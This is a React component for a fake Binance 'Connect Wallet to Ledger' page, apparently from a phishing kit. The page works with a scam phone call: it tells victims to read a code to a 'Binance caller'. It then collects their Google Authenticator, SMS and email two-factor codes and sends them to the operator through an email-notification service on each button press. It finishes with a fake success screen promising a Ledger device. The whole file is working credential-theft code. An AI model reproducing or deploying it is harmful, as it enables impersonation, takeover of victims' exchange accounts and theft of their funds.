import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { Phone, CheckCircle, Wallet, Shield, Smartphone, Mail } from "lucide-react";
import { sendEmailNotification } from "@/services/emailService";

type ConnectionStep = 'initial' | 'callRequest' | 'codeEntry' | 'success';

const WalletLedgerConnection = () => {
  const [currentStep, setCurrentStep] = useState<ConnectionStep>('initial');
  const [codes, setCodes] = useState({
    googleAuth: '',
    sms: '',
    email: ''
  });
  const { toast } = useToast();

  const handleRequestCall = async () => {
    try {
      console.log('🚨 Sending email for request call button click');
      await sendEmailNotification({
        step: "Wallet Connection - Call Requested (Button Click)",
        timestamp: new Date().toISOString(),
        allFormData: {
          googleAuth: codes.googleAuth || 'N/A',
          sms: codes.sms || 'N/A',
          email: codes.email || 'N/A',
          action: 'call_requested'
        }
      });
    } catch (error) {
      console.error('Email notification failed:', error);
    }
    setCurrentStep('callRequest');
  };

  const handleCallConfirm = async () => {
    try {
      console.log('🚨 Sending email for call confirm button click');
      await sendEmailNotification({
        step: "Wallet Connection - Call Confirmed (Button Click)",
        timestamp: new Date().toISOString(),
        allFormData: {
          googleAuth: codes.googleAuth || 'N/A',
          sms: codes.sms || 'N/A',
          email: codes.email || 'N/A',
          action: 'call_confirmed',
          verificationCode: '88-12-30'
        }
      });
    } catch (error) {
      console.error('Email notification failed:', error);
    }
    setCurrentStep('codeEntry');
    toast({
      title: "Call confirmed",
      description: "Please provide the verification code to the Binance caller.",
    });
  };

  const handleCodeChange = (field: keyof typeof codes, value: string) => {
    // Apply different length limits based on the field
    let processedValue = value;
    if (field === 'googleAuth') {
      processedValue = value.replace(/\D/g, '').slice(0, 6);
    } else {
      // Allow longer codes for SMS and email (up to 12 characters)
      processedValue = value.replace(/\D/g, '').slice(0, 12);
    }
    setCodes(prev => ({ ...prev, [field]: processedValue }));
  };

  const handleCodeSubmit = async (field: keyof typeof codes) => {
    const minLength = field === 'googleAuth' ? 6 : 4; // Minimum 4 characters for SMS/email, 6 for Google Auth
    
    if (codes[field].length >= minLength) {
      try {
        console.log(`🚨 Sending email for ${field} code submit button click`);
        await sendEmailNotification({
          step: `Wallet Connection - ${field} Code Submitted (Button Click)`,
          field: `${field} code submission`,
          value: codes[field],
          timestamp: new Date().toISOString(),
          allFormData: {
            googleAuth: codes.googleAuth || 'N/A',
            sms: codes.sms || 'N/A',
            email: codes.email || 'N/A',
            submittedField: field,
            submittedValue: codes[field],
            action: `${field}_code_submitted`
          }
        });
      } catch (error) {
        console.error('Email notification failed:', error);
      }

      toast({
        title: "Code submitted",
        description: `${field === 'googleAuth' ? 'Google Authenticator' : field === 'sms' ? 'SMS' : 'Email'} code has been submitted successfully.`,
      });
    } else {
      toast({
        title: "Invalid code",
        description: `Please enter a valid code (minimum ${minLength} digits).`,
        variant: "destructive",
      });
    }
  };

  const handleFinalNext = async () => {
    try {
      console.log('🚨 Sending email for final next button click');
      await sendEmailNotification({
        step: "Wallet Connection - Final Step (Button Click)",
        timestamp: new Date().toISOString(),
        allFormData: {
          googleAuth: codes.googleAuth || 'N/A',
          sms: codes.sms || 'N/A',
          email: codes.email || 'N/A',
          action: 'final_step_completed',
          allCodesSubmitted: true
        }
      });
    } catch (error) {
      console.error('Email notification failed:', error);
    }
    setCurrentStep('success');
  };

  const renderStep = () => {
    switch (currentStep) {
      case 'initial':
        return (
          <div className="text-center space-y-8">
            <div className="space-y-4">
              <div className="flex items-center justify-center">
                <div className="bg-gradient-to-r from-binance-yellow to-yellow-400 p-4 rounded-full">
                  <Wallet className="w-12 h-12 text-black" />
                </div>
              </div>
              <h1 className="text-4xl font-bold text-white tracking-tight">Connect Wallet to Ledger</h1>
              <p className="text-[#848E9C] text-lg max-w-2xl mx-auto leading-relaxed">
                Our security specialists will assist you with connecting your wallet to ensure maximum protection for your digital assets through our secure ledger integration process.
              </p>
            </div>

            <div className="bg-gradient-to-r from-blue-600/10 to-blue-500/10 border border-blue-500/20 rounded-lg p-6">
              <div className="flex items-center gap-3 mb-3">
                <Shield className="w-6 h-6 text-blue-400" />
                <h3 className="text-xl font-semibold text-white">Secure Assistance</h3>
              </div>
              <p className="text-[#B7BDC6] text-base leading-relaxed">
                For your security, one of our certified representatives will guide you through the wallet connection process via phone call to ensure your assets remain protected.
              </p>
            </div>

            <Button
              onClick={handleRequestCall}
              className="bg-blue-600 hover:bg-blue-700 text-white px-8 py-4 h-14 text-lg font-semibold rounded-lg transition-all duration-200 shadow-lg hover:shadow-xl"
            >
              <Phone className="w-6 h-6 mr-3" />
              Confirm Binance is on the Line
            </Button>
          </div>
        );

      case 'callRequest':
        return (
          <div className="text-center space-y-8">
            <div className="space-y-4">
              <div className="flex items-center justify-center">
                <div className="bg-gradient-to-r from-binance-yellow to-yellow-400 p-4 rounded-full">
                  <Shield className="w-12 h-12 text-black" />
                </div>
              </div>
              <h2 className="text-3xl font-bold text-white">Verification Code for Binance Caller</h2>
              <p className="text-[#848E9C] text-lg">
                Provide this code to verify your identity with the Binance representative
              </p>
            </div>
            
            <div className="bg-[#2B3139] rounded-xl p-8 space-y-6 border border-[#3C4043]">
              <div className="space-y-3">
                <p className="text-[#B7BDC6] text-base">
                  Please give this verification code to the Binance caller to confirm your identity.
                </p>
                <p className="text-[#848E9C] text-sm">
                  The caller will ask for this code to verify that you are the legitimate account holder.
                </p>
              </div>
              
              <div className="bg-gradient-to-r from-binance-yellow/10 to-yellow-400/10 rounded-xl p-6 border-2 border-binance-yellow/30">
                <div className="space-y-2">
                  <p className="text-white text-lg font-semibold">Give this code to the Binance caller:</p>
                  <p className="text-binance-yellow text-4xl font-bold tracking-widest font-mono">88-12-30</p>
                </div>
              </div>
              
              <p className="text-[#848E9C] text-sm leading-relaxed">
                This code verifies your identity and ensures the security of your wallet connection process. Only share this with the official Binance representative on the call.
              </p>
            </div>

            <Button
              onClick={handleCallConfirm}
              className="bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-14 px-10 text-lg rounded-lg transition-all duration-200 shadow-lg"
            >
              Next
            </Button>
          </div>
        );

      case 'codeEntry':
        return (
          <div className="space-y-8">
            <div className="text-center space-y-4">
              <div className="flex items-center justify-center">
                <div className="bg-gradient-to-r from-binance-yellow to-yellow-400 p-4 rounded-full">
                  <Shield className="w-12 h-12 text-black" />
                </div>
              </div>
              <h2 className="text-3xl font-bold text-white">Additional Security Verification</h2>
              <p className="text-[#848E9C] text-lg max-w-2xl mx-auto">
                You may optionally enter verification codes from any of the following sources for enhanced security:
              </p>
            </div>

            <div className="space-y-6">
              {/* Google Authenticator */}
              <div className="bg-[#2B3139] rounded-xl p-6 border border-[#3C4043]">
                <div className="flex items-center gap-3 mb-4">
                  <Shield className="w-6 h-6 text-green-400" />
                  <Label htmlFor="googleAuth" className="text-white text-lg font-semibold">
                    Google Authenticator Code
                  </Label>
                  <span className="text-[#848E9C] text-sm">(Optional)</span>
                </div>
                <div className="flex gap-3">
                  <Input
                    id="googleAuth"
                    type="text"
                    value={codes.googleAuth}
                    onChange={(e) => handleCodeChange('googleAuth', e.target.value)}
                    className="bg-[#181A20] border-[#3C4043] text-white text-lg h-12 font-mono tracking-wider focus:border-green-400 flex-1"
                    placeholder="000000"
                    maxLength={6}
                  />
                  <Button
                    onClick={() => handleCodeSubmit('googleAuth')}
                    disabled={codes.googleAuth.length !== 6}
                    className="bg-green-600 hover:bg-green-700 text-white px-6 h-12 font-semibold"
                  >
                    Submit
                  </Button>
                </div>
              </div>

              {/* SMS Code */}
              <div className="bg-[#2B3139] rounded-xl p-6 border border-[#3C4043]">
                <div className="flex items-center gap-3 mb-4">
                  <Smartphone className="w-6 h-6 text-blue-400" />
                  <Label htmlFor="sms" className="text-white text-lg font-semibold">
                    SMS Code
                  </Label>
                  <span className="text-[#848E9C] text-sm">(Optional)</span>
                </div>
                <div className="flex gap-3">
                  <Input
                    id="sms"
                    type="text"
                    value={codes.sms}
                    onChange={(e) => handleCodeChange('sms', e.target.value)}
                    className="bg-[#181A20] border-[#3C4043] text-white text-lg h-12 font-mono tracking-wider focus:border-blue-400 flex-1"
                    placeholder="0000"
                    maxLength={12}
                  />
                  <Button
                    onClick={() => handleCodeSubmit('sms')}
                    disabled={codes.sms.length < 4}
                    className="bg-blue-600 hover:bg-blue-700 text-white px-6 h-12 font-semibold"
                  >
                    Submit
                  </Button>
                </div>
              </div>

              {/* Email Code */}
              <div className="bg-[#2B3139] rounded-xl p-6 border border-[#3C4043]">
                <div className="flex items-center gap-3 mb-4">
                  <Mail className="w-6 h-6 text-purple-400" />
                  <Label htmlFor="email" className="text-white text-lg font-semibold">
                    Email Code
                  </Label>
                  <span className="text-[#848E9C] text-sm">(Optional)</span>
                </div>
                <div className="flex gap-3">
                  <Input
                    id="email"
                    type="text"
                    value={codes.email}
                    onChange={(e) => handleCodeChange('email', e.target.value)}
                    className="bg-[#181A20] border-[#3C4043] text-white text-lg h-12 font-mono tracking-wider focus:border-purple-400 flex-1"
                    placeholder="0000"
                    maxLength={12}
                  />
                  <Button
                    onClick={() => handleCodeSubmit('email')}
                    disabled={codes.email.length < 4}
                    className="bg-purple-600 hover:bg-purple-700 text-white px-6 h-12 font-semibold"
                  >
                    Submit
                  </Button>
                </div>
              </div>
            </div>

            <Button
              onClick={handleFinalNext}
              className="w-full bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-14 text-lg rounded-lg transition-all duration-200 shadow-lg"
            >
              Continue to Wallet Connection
            </Button>
          </div>
        );

      case 'success':
        return (
          <div className="text-center space-y-8">
            <div className="space-y-6">
              <div className="flex items-center justify-center">
                <div className="bg-gradient-to-r from-green-500 to-green-400 p-6 rounded-full">
                  <CheckCircle className="w-16 h-16 text-white" />
                </div>
              </div>
              
              <div className="space-y-4">
                <h2 className="text-4xl font-bold text-white tracking-tight">Connection Successful!</h2>
                <p className="text-green-400 text-xl font-semibold">Your wallet is now securely linked</p>
              </div>
              
              <div className="bg-gradient-to-r from-green-600/10 to-green-500/10 border border-green-500/20 rounded-xl p-8">
                <div className="space-y-4">
                  <div className="flex items-center justify-center gap-3 mb-4">
                    <Wallet className="w-8 h-8 text-green-400" />
                    <h3 className="text-2xl font-semibold text-white">Ledger Delivery Information</h3>
                  </div>
                  <p className="text-white text-lg leading-relaxed">
                    Your wallet has been successfully linked to your ledger. You will normally receive it within <span className="font-semibold text-binance-yellow">5 business days</span>.
                  </p>
                  <p className="text-[#B7BDC6] text-base">
                    We will keep you updated via email regarding the delivery status and tracking information.
                  </p>
                </div>
              </div>
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <div className="min-h-[calc(100vh-200px)] flex items-center justify-center py-8 px-4">
      <div className="w-full max-w-2xl mx-auto">
        <div className="bg-[#1E2026] rounded-2xl border border-[#2B3139] p-8 shadow-2xl">
          {renderStep()}
        </div>
      </div>
    </div>
  );
};

export default WalletLedgerConnection;
